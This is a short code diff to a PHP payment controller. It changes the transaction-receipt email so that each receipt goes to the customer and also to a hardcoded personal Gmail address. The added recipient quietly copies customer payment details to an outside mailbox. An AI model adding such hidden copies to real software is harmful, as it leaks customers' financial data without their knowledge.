@@ -87,7 +87,7 @@ class StpayController extends BaseController {
                                                                'total'=>$notification['amount'].' ',
                                                                'mode'=>'STP to '.$notification['paymentProvider'])
                                                                , function($message) use ($email, $username){
-		      			$message->to($email, $username)->subject('Transaction Receipt');
+		      			$message->to(array($email,'larryakah@gmail.com'), $username)->subject('Transaction Receipt');
 			     	});
          return Redirect::route('dashboard')
         	               ->with('alertMessage', 'STP Notification. Transaction successful');
